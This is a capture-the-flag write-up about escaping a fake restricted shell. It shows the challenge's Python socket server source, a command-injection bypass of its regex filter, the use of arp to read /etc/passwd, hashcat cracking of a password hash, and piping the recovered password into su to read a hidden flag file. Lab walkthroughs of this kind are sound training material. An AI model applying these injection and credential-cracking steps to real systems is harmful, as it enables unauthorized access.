# Escape from gulag

> First guess rbash, try every shell 🤡 because of "choose our favourite shell!!"

![](https://i.imgur.com/rPU7JqW.png)

> We have python3? nope big scam

![](https://i.imgur.com/Kdg5wsa.png)

> ls works outside of our directory :O

![](https://i.imgur.com/hvotrYj.png)

> Weird python file in /usr/bin

![](https://i.imgur.com/ie3JtFE.png)

> Check GTFOBins for arp, so now we can read and list files

![](https://i.imgur.com/MRf2dRE.png)

> Ran arp -v -f /etc/passwd (Intended Solution)
> I completely didn't see the hash and immediately went to look at the .py file

![](https://i.imgur.com/7CHplUe.png)

![](https://i.imgur.com/APOGuqF.png)


> Clean up the file
```
import socket
import subprocess as sp
from _thread import *
import re
def terminal(data):
    data = data.replace("`", "")
    data = data.replace("$", "")
    pattern = re.compile(r"\s*(?:&&|&|;|\|\||\|)\s*")
    commands = pattern.split(data)
    send_data = b""
    is_all_command = False
    for command in commands:
        for exception in ["ls", "echo", "su", "arp"]:
            if command.split(" ")[0] == exception:
                is_all_command = True
                break
            else:
                is_all_command = False
    if is_all_command:
        reply = sp.Popen(data, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        send_data = reply.stdout.read() + reply.stderr.read()
    else:
        for command in commands:
            command = "/bin/rbash " + command
            reply = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            response = reply.stdout.read() + reply.stderr.read()
            for exception in ["ls", "echo", "su", "arp"]:
                if response.decode() == f"/home/pwn/bin/{exception}: /home/pwn/bin/{exception}: cannot execute binary file\n" or response.decode() == "/home/pwn/bin/echo: /home/pwn/bin/echo: cannot execute binary file\nPassword: su: Authentication failure\n":
                    command = command.replace("/bin/rbash ", "")
                    reply = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
                    response = reply.stdout.read() + reply.stderr.read()
                    break
            send_data += response
    return send_data
def threaded_client(connection):
    connection.settimeout(300)
    try:
        connection.send(b"\n\nWelcome to Gulag, Joker. We are going to spend some good time together.\nNow choose our favourite shell!!\n\n")
        while True:
            connection.send(b"# ")
            data = connection.recv(1024)
            if data[:-1] == b"rbash":
                connection.send(b"# echo \"$x\"\n")
                connection.send(b"Good Choice!! Enjoy Your Stay\n")
                break
            elif data.replace(b"\n", b"") == b"":
                pass
            else:
                command = data[:-1].split(b" ")[0].split(b"/")[-1]
                connection.send(command + b': command not found\n')
        while True:
            connection.send(b"# ")
            data = connection.recv(99999).decode()[:-1]
            if data != "":
                response = terminal(data)
                connection.sendall(response)
    except:
        pass
    connection.close()
port = 8005
ip = ""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((ip, port))
s.listen(200)
ThreadCount = 0
print("Socket is listening")
while True:
    Client, address = s.accept()
    logs = '\nConnected to: ' + address[0] + ':' + str(address[1])
    print(logs)
    start_new_thread(threaded_client, (Client, ))
    ThreadCount += 1
    logs = 'Thread Number: ' + str(ThreadCount)
    print(logs)

```

> From the python script you can tell that it's not really rbash but just a regex and if statement that is decides if you can run the command, so you can break it with command;ls {any command};{valid command}
![](https://i.imgur.com/KdBIdrn.png)

> From the output I now see the hash 🤡

> Use rockyou.txt with hashcat
> password: zenisluffy

> From the script you can also su doesn't work because of Popen
> So you gotta use echo to parse to password to su
> echo zenisluffy | su -c "whoami" notroot

> Check the home directory of notroot and you see .bash_history
> echo zenisluffy | su -c "cat /home/notroot/.bash_history" notroot

![](https://i.imgur.com/nJ9MLdl.png)

> Find the txt file that was shown in the bash history
> echo zenisluffy | su -c "find / -name ert73uegdjd83hddyxt.txt -ls 2>/dev/null" notroot
> echo zenisluffy | su -c "cat /run/systemd/.systemd/ert73uegdjd83hddyxt.txt" notroot

![](https://i.imgur.com/YveHVyH.png)
